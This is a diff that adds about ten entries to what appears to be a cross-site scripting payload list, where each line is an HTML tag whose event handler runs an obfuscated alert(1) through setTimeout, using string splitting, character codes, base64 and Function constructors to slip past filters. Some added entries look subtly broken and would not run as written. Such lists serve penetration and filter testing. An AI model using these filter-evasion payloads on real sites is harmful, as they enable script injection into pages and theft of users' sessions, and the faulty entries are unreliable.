@@ -19,4 +19,13 @@
 <body onload="setTimeout('alert`1`',1)">
 <bgsound onload="setTimeout(() => alert(1), 1)">
 <marquee onstart="setTimeout(()=>{alert(1)},1)">
-<keygen autofocus onfocus="setTimeout('alert(1)',1)">
+<keygen autofocus onfocus="setTimeout('alert(1)',1)"><marquee onstart=setTimeout('ale'+'rt(1)',100)></marquee>
+<img src=x onerror=setTimeout(String.fromCharCode(97,108,101,114,116,40,49,41),100)>
+<input type=text autofocus onfocus=setTimeout([...`${'alert(1)'}`].join(``),100)>
+<body onpageshow=setTimeout(Function('al'+'ert(1)'),100)>
+<base href="javascript:setTimeout('console.log(alert(1))', 100);">
+<video src=x onerror=setTimeout(na+'vigator.al'+'ert(1)',100)>
+<keygen autofocus onfocus=setTimeout(atob('YWxlcnQoMSk='),100)>
+<form autofocus onfocus=setTimeout``(new Function("a"+"lert(1)"),100)>
+<embed src=x onerror=setTimeout(eval,100)('a'+'lert(1)')>
+<command type="command" label="XSS" icon="x" onclick=setTimeout(((a='alert')+`(1)`),100)>
